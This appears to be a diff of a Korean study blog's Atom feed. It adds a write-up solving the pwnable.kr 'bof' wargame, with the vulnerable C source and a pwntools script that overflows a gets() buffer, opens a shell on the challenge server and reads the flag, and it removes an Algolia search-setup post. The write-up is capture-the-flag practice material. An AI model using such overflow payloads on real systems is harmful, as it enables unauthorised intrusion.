@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="https://imreplay.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://imreplay.com/" rel="alternate" type="text/html" /><updated>2018-07-14T09:27:41+09:00</updated><id>https://imreplay.com/</id><title type="html">Imreplay blog</title><subtitle>Imreplay's study blog.</subtitle><author><name>Imreplay</name><email>imreplay@imreplay.com</email></author><entry><title type="html">[Pwnable.kr] Toddler’s Bottle - collision 풀이</title><link href="https://imreplay.com/wargame/pwnablekr-col/" rel="alternate" type="text/html" title="[Pwnable.kr] Toddler's Bottle - collision 풀이" /><published>2018-07-14T00:00:00+09:00</published><updated>2018-07-14T09:20:00+09:00</updated><id>https://imreplay.com/wargame/pwnablekr-col</id><content type="html" xml:base="https://imreplay.com/wargame/pwnablekr-col/">&lt;p&gt;문제&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="https://imreplay.com/feed.xml" rel="self" type="application/atom+xml" /><link href="https://imreplay.com/" rel="alternate" type="text/html" /><updated>2018-07-14T23:15:41+09:00</updated><id>https://imreplay.com/</id><title type="html">Imreplay blog</title><subtitle>Imreplay's study blog.</subtitle><author><name>Imreplay</name><email>imreplay@imreplay.com</email></author><entry><title type="html">[Pwnable.kr] Toddler’s Bottle - collision 풀이</title><link href="https://imreplay.com/wargame/pwnablekr-col/" rel="alternate" type="text/html" title="[Pwnable.kr] Toddler's Bottle - collision 풀이" /><published>2018-07-14T00:00:00+09:00</published><updated>2018-07-14T09:20:00+09:00</updated><id>https://imreplay.com/wargame/pwnablekr-col</id><content type="html" xml:base="https://imreplay.com/wargame/pwnablekr-col/">&lt;p&gt;문제&lt;/p&gt;
 
 &lt;h3 id=&quot;colc&quot;&gt;col.c&lt;/h3&gt;
 
@@ -60,7 +60,68 @@ r = s.run(&amp;quot;&amp;quot;&amp;quot;./col `python -c &amp;#39;print &amp;quo
 print r.recvall()
 s.close()
 &lt;/pre&gt;&lt;/noscript&gt;
-&lt;script src=&quot;https://gist.github.com/imreplay/56a2173d5551f0044b03db53752bbb87.js&quot;&gt; &lt;/script&gt;</content><author><name>Imreplay</name><email>imreplay@imreplay.com</email></author><category term="system" /><category term="Pwnable.kr" /><summary type="html">pwntools를 사용한 collision 풀이</summary></entry><entry><title type="html">[정보보안산업기사] 암호화 개요 요약</title><link href="https://imreplay.com/study/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88%EC%82%B0%EC%97%85%EA%B8%B0%EC%82%AC-%EC%95%94%ED%98%B8%ED%95%99%EA%B0%9C%EC%9A%94-0714/" rel="alternate" type="text/html" title="[정보보안산업기사] 암호화 개요 요약" /><published>2018-07-14T00:00:00+09:00</published><updated>2018-07-14T09:24:00+09:00</updated><id>https://imreplay.com/study/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88%EC%82%B0%EC%97%85%EA%B8%B0%EC%82%AC-%EC%95%94%ED%98%B8%ED%95%99%EA%B0%9C%EC%9A%94-0714</id><content type="html" xml:base="https://imreplay.com/study/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88%EC%82%B0%EC%97%85%EA%B8%B0%EC%82%AC-%EC%95%94%ED%98%B8%ED%95%99%EA%B0%9C%EC%9A%94-0714/">&lt;h2 id=&quot;암호학&quot;&gt;암호학&lt;/h2&gt;
+&lt;script src=&quot;https://gist.github.com/imreplay/56a2173d5551f0044b03db53752bbb87.js&quot;&gt; &lt;/script&gt;</content><author><name>Imreplay</name><email>imreplay@imreplay.com</email></author><category term="system" /><category term="Pwnable.kr" /><summary type="html">pwntools를 사용한 collision 풀이</summary></entry><entry><title type="html">[Pwnable.kr] Toddler’s Bottle - bof 풀이</title><link href="https://imreplay.com/wargame/pwnablekr-bof/" rel="alternate" type="text/html" title="[Pwnable.kr] Toddler's Bottle - bof 풀이" /><published>2018-07-14T00:00:00+09:00</published><updated>2018-07-14T23:11:00+09:00</updated><id>https://imreplay.com/wargame/pwnablekr-bof</id><content type="html" xml:base="https://imreplay.com/wargame/pwnablekr-bof/">&lt;p&gt;문제&lt;/p&gt;
+
+&lt;h3 id=&quot;bofc&quot;&gt;bof.c&lt;/h3&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;overflow me : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;gets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;overflowme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;// smash me!
+&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xcafebabe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Nah..&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; 함수를 통해 문자열을 입력받지만 길이를 체크하지 않는다.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;를 0xcafebabe 로 덮어씌우면 해결할 수 있는 문제이다.&lt;/p&gt;
+
+&lt;p&gt;“a”문자열을 32개부터 한개씩 늘려가며 뒤에 0xcafebabe를 붙이는 방법으로 풀이하였다.&lt;/p&gt;
+
+&lt;p&gt;풀이 후 colorama를 사용하는 방법을 알게 되어 해당 방법으로 하이라이팅도 해보았다.&lt;/p&gt;
+
+&lt;h3 id=&quot;bof_payloadpy&quot;&gt;bof_payload.py&lt;/h3&gt;
+
+&lt;noscript&gt;&lt;pre&gt;from pwn import *
+import struct
+
+# 리틀엔디언을 위한 LE 축약함수 정의
+LE = lambda x : struct.pack(&amp;quot;&amp;lt;L&amp;quot; , x)
+
+key = LE(0xcafebabe)
+
+# 32를 시작으로 i의 값을 증가시켜 &amp;quot;a&amp;quot;의 개수를 늘리면서 시도
+for i in range(32,60):
+  r = remote(&amp;#39;pwnable.kr&amp;#39;, 9000)
+  r.sendline(&amp;quot;a&amp;quot;*i+key)
+  
+  res = r.recv(1024, timeout=1)
+  # 조건문이 참이면 print문 없이 쉘을 실행하므로
+  if res == &amp;quot;&amp;quot;:
+    print &amp;quot;Find!!&amp;quot;, i
+    r.sendline(&amp;quot;cat flag\n&amp;quot;)
+    print r.recv(1024)
+    break
+  else:
+    pass
+  r.close()&lt;/pre&gt;&lt;/noscript&gt;
+&lt;script src=&quot;https://gist.github.com/imreplay/a523532bd5a1d240ff6d00c9d62505b0.js&quot;&gt; &lt;/script&gt;
+
+&lt;p&gt;두번째 파일의 실행결과는 다음과 같다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/pwnable/bof_color.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;</content><author><name>Imreplay</name><email>imreplay@imreplay.com</email></author><category term="system" /><category term="Pwnable.kr" /><summary type="html">pwntools를 사용한 bof 풀이</summary></entry><entry><title type="html">[정보보안산업기사] 암호화 개요 요약</title><link href="https://imreplay.com/study/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88%EC%82%B0%EC%97%85%EA%B8%B0%EC%82%AC-%EC%95%94%ED%98%B8%ED%95%99%EA%B0%9C%EC%9A%94-0714/" rel="alternate" type="text/html" title="[정보보안산업기사] 암호화 개요 요약" /><published>2018-07-14T00:00:00+09:00</published><updated>2018-07-14T09:24:00+09:00</updated><id>https://imreplay.com/study/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88%EC%82%B0%EC%97%85%EA%B8%B0%EC%82%AC-%EC%95%94%ED%98%B8%ED%95%99%EA%B0%9C%EC%9A%94-0714</id><content type="html" xml:base="https://imreplay.com/study/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88%EC%82%B0%EC%97%85%EA%B8%B0%EC%82%AC-%EC%95%94%ED%98%B8%ED%95%99%EA%B0%9C%EC%9A%94-0714/">&lt;h2 id=&quot;암호학&quot;&gt;암호학&lt;/h2&gt;
 
 &lt;dl&gt;
   &lt;dt&gt;암호&lt;/dt&gt;
@@ -1231,145 +1292,4 @@ You can also add the .notice class to a div element.
       &lt;p&gt;각주 내용 2 &lt;a href=&quot;#fnref:2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
     &lt;/li&gt;
   &lt;/ol&gt;
-&lt;/div&gt;</content><author><name>Imreplay</name><email>imreplay@imreplay.com</email></author><category term="jekyll" /><category term="markdown" /><category term="kramdown" /><summary type="html">다양한 마크다운 문법과 테마에서 지원하는 기능들을 간단하게 미리보기</summary></entry><entry><title type="html">Travis-ci를 이용해 Github.io 블로그에 검색도구인 Algolia를 적용시켜보자.</title><link href="https://imreplay.com/blogging/%EA%B2%80%EC%83%89-%EB%8F%84%EA%B5%AC%EC%9D%B8-Algolia%EB%A5%BC-%EC%A0%81%EC%9A%A9%ED%95%B4%EB%B3%B4%EC%9E%90/" rel="alternate" type="text/html" title="Travis-ci를 이용해 Github.io 블로그에 검색도구인 Algolia를 적용시켜보자." /><published>2018-07-03T00:00:00+09:00</published><updated>2018-07-03T16:07:00+09:00</updated><id>https://imreplay.com/blogging/%EA%B2%80%EC%83%89%20%EB%8F%84%EA%B5%AC%EC%9D%B8%20Algolia%EB%A5%BC%20%EC%A0%81%EC%9A%A9%ED%95%B4%EB%B3%B4%EC%9E%90</id><content type="html" xml:base="https://imreplay.com/blogging/%EA%B2%80%EC%83%89-%EB%8F%84%EA%B5%AC%EC%9D%B8-Algolia%EB%A5%BC-%EC%A0%81%EC%9A%A9%ED%95%B4%EB%B3%B4%EC%9E%90/">&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
-
-&lt;p&gt;이번 포스팅에서는 검색도구인 algolia를 jekyll에서 적용시키는 방법에 대해 포스팅하겠습니다.&lt;/p&gt;
-
-&lt;p&gt;먼저 어떻게 생긴 친구인지 한번 보고 시작하는 것도 나쁘지 않겠죠?&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia.jpg&quot; alt=&quot;algolia&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;검색한 키워드를 하이라이팅 해주고 비슷한 단어에 대한 검색도 해줘서 오타가 있어도 어느정도 검색결과가 안정적으로 나오는 것을 보고 선택하게 되었습니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;algolia-설정하기&quot;&gt;algolia 설정하기&lt;/h2&gt;
-
-&lt;p class=&quot;notice&quot;&gt;포스팅에서 사용되는 환경은 Travis-ci 를 사용한 환경입니다.
-Githib pages 를 사용한 환경은 &lt;a href=&quot;https://community.algolia.com/jekyll-algolia/github-pages.html&quot;&gt;https://community.algolia.com/jekyll-algolia/github-pages.html&lt;/a&gt; 를 참고 바랍니다.&lt;/p&gt;
-
-&lt;p&gt;먼저 &lt;a href=&quot;https://www.algolia.com/&quot;&gt;algolia&lt;/a&gt; 사이트에 접속하여 회원가입을 해줍니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia-signup.jpg&quot; alt=&quot;algolia-signup.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Github를 통한 로그인 기능을 지원하므로 간단하게 가입이 가능합니다.&lt;/p&gt;
-
-&lt;p&gt;간단한 개인정보를 입력하는 창이 나옵니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia-signup2.jpg&quot; alt=&quot;algolia-signup2.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;다음으로 데이터센터를 선택하는 부분입니다.&lt;/p&gt;
-
-&lt;p&gt;가깝고 빠른 데이터 센터로 하시면 됩니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia-signup3.jpg&quot; alt=&quot;algolia-signup3.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;뭔가를 물어보는 것 같지만 &lt;code class=&quot;highlighter-rouge&quot;&gt;Skip&lt;/code&gt; 이라는 버튼이 있는걸 보니 꼭 필요한건 아닌가 봅니다&lt;/p&gt;
-
-&lt;p&gt;가볍게 &lt;code class=&quot;highlighter-rouge&quot;&gt;skip&lt;/code&gt; 을 눌러줍니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia-signup4.jpg&quot; alt=&quot;algolia-signup4.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;이렇게 가입이 끝났습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia-signup5.jpg&quot; alt=&quot;algolia-signup5.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;대시보드로 이동해봅시다.&lt;/p&gt;
-
-&lt;p&gt;튜토리얼을 할것인지 물어봅니다. 원하시는 분들은 들어보시면 됩니다!&lt;/p&gt;
-
-&lt;p&gt;튜토리얼부분은 넘어가도록하겠습니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;요금-정책-선택&quot;&gt;요금 정책 선택&lt;/h2&gt;
-
-&lt;p&gt;메인페이지에서 가장 눈에 띄는 부분은 상단의 &lt;code class=&quot;highlighter-rouge&quot;&gt;ESSENTIAL plan - 14 free days remaining&lt;/code&gt; 라는 부분입니다.&lt;/p&gt;
-
-&lt;p&gt;검색 서비스 요금 정책에 관한 내용인거 같군요 14일 무료라고 하지만 뭔가 찝찝하신 분들은 우측 하단에 보이는 &lt;code class=&quot;highlighter-rouge&quot;&gt;CHAHNGE PLAN&lt;/code&gt; 버튼을 눌러 COMMUNITY 를 선택하시면 됩니다.&lt;/p&gt;
-
-&lt;p&gt;ESSENTIAL 부분에 &lt;code class=&quot;highlighter-rouge&quot;&gt;FREE FOR OPEN SOURCE&lt;/code&gt; 라고 적혀있는 걸 보니 잘 살펴보시고 해당하시면 신청해보는 것도 좋은 것 같습니다!&lt;/p&gt;
-
-&lt;h2 id=&quot;설정하기&quot;&gt;설정하기&lt;/h2&gt;
-&lt;p&gt;이제 기본적인 설정을 해보겠습니다.&lt;/p&gt;
-
-&lt;p&gt;좌측 메뉴중에 &lt;code class=&quot;highlighter-rouge&quot;&gt;Indices&lt;/code&gt; 탭을 선택하여 줍니다.
-&lt;img src=&quot;/assets/img/algolia-setup1.jpg&quot; alt=&quot;algolia-set.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;예제로 만들어진 인덱스가 존재하는 것 같군요. &lt;code class=&quot;highlighter-rouge&quot;&gt;MANAGE CURRENT INDEX&lt;/code&gt; 를 눌러 DELETE 해줍니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia-setup1.5.jpg&quot; alt=&quot;algolia-set.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;다음으로 &lt;code class=&quot;highlighter-rouge&quot;&gt;New index&lt;/code&gt;를 눌러 새로운 인덱스를 추가해 줍니다.&lt;/p&gt;
-
-&lt;p&gt;적당한 Index name을 기입하여 준 후 &lt;code class=&quot;highlighter-rouge&quot;&gt;CREATE&lt;/code&gt;를 눌러 새로운 인덱스를 생성합니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia-setup2.jpg&quot; alt=&quot;algolia-set.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;새로운 인덱스가 만들어 진것을 확인 후 좌측의 API Keys 를 선택해줍니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia-setup3.jpg&quot; alt=&quot;algolia-set.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Application ID&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;Search-Only API Key&lt;/code&gt;를 확인할 수 있습니다.&lt;/p&gt;
-
-&lt;p&gt;이제 블로그에 적용 시켜보도록 하겠습니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;_config.yml&lt;/code&gt; 파일의 search 부분을 찾아 수정해줍니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-yml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;search                   &lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# true, false (default)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;search_full_content      &lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;true&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# true, false (default)&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;search_provider          &lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;algolia&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# lunr (default), algolia, google&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;algolia&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;application_id         &lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;237ZENFYNY&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# YOUR_APPLICATION_ID&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;index_name             &lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;blog&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# YOUR_INDEX_NAME&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;search_only_api_key    &lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;5cfd50ded1da95d695708070be40e3b9&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# YOUR_SEARCH_ONLY_API_KEY&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;powered_by             &lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# true (default), false&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;search_provider 는 algolia 를 입력 해주고, &lt;code class=&quot;highlighter-rouge&quot;&gt;application_id&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;search_only_api_key&lt;/code&gt; 는 API keys에서 보여지는 값들을 입력해줍니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;index_name&lt;/code&gt; 에는 방금전에 index를 생성할 때 입력했던 값을 넣어주면 됩니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;gemfile-에-gem-추가하기&quot;&gt;Gemfile 에 Gem 추가하기&lt;/h2&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;jekyll-algolia&quot;&lt;/code&gt; Gem 을 Gemfile에 :jekyll_plugins 섹션에 추가해줍니다.&lt;/p&gt;
-
-&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt; &lt;span class=&quot;ss&quot;&gt;:jekyll_plugins&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;gem&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;jekyll-feed&quot;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;gem&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;jekyll-seo-tag&quot;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;gem&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;jekyll-sitemap&quot;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;gem&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;jekyll-paginate&quot;&lt;/span&gt;
-  &lt;span class=&quot;n&quot;&gt;gem&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;jekyll-algolia&quot;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;travis-ci에-api-key-추가-해주기&quot;&gt;Travis-ci에 API key 추가 해주기&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://travis-ci.org&quot;&gt;Travis-ci&lt;/a&gt; 에 접속하여 원하는 &lt;code class=&quot;highlighter-rouge&quot;&gt;repo&lt;/code&gt; 의 Settings에 접속합니다.&lt;/p&gt;
-
-&lt;p&gt;Name 값으로는 &lt;code class=&quot;highlighter-rouge&quot;&gt;ALGOLIA_API_KEY&lt;/code&gt;를 , Value 값에는 algolia 사이트의 API keys 탭에 있는 Admin API Key 값을 복사하여 적어줍니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia-setup4.jpg&quot; alt=&quot;algolia-setup4.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Build log에는 Display되면 안되므로 그대로 둔 후 Add 해줍니다.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/algolia-setup5.jpg&quot; alt=&quot;algolia-setup5.jpg&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;이런식으로 환경변수에 추가된 것을 확인할 수 있습니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;rakefile-수정하기&quot;&gt;Rakefile 수정하기&lt;/h2&gt;
-
-&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;##중략&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# Generate the site&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bundle exec jekyll build&quot;&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# Run Algolia &lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bundle exec jekyll algolia&quot;&lt;/span&gt;
-
-
-&lt;span class=&quot;c1&quot;&gt;##중략&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;빌드 후 algolia에 해당 내용을 전달하여 검색을 빠르게 진행할 수 있도록 합니다.&lt;/p&gt;
-
-&lt;p&gt;저장 후 커밋 해주면 검색기능을 사용할 수 있습니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;outtro&quot;&gt;Outtro&lt;/h2&gt;
-&lt;p&gt;포스팅을 작성하면서 &lt;code class=&quot;highlighter-rouge&quot;&gt;ESSENTIAL&lt;/code&gt; 플랜에 &lt;code class=&quot;highlighter-rouge&quot;&gt;FREE FOR OPEN SOURCE&lt;/code&gt; 문구가 달려있는걸 발견했네요 얼른 읽어보러 가야겠습니다!&lt;/p&gt;</content><author><name>Imreplay</name><email>imreplay@imreplay.com</email></author><category term="disqus" /><summary type="html">검색 도구인 algolia를 github.io에 적용시키기</summary></entry></feed>
+&lt;/div&gt;</content><author><name>Imreplay</name><email>imreplay@imreplay.com</email></author><category term="jekyll" /><category term="markdown" /><category term="kramdown" /><summary type="html">다양한 마크다운 문법과 테마에서 지원하는 기능들을 간단하게 미리보기</summary></entry></feed>
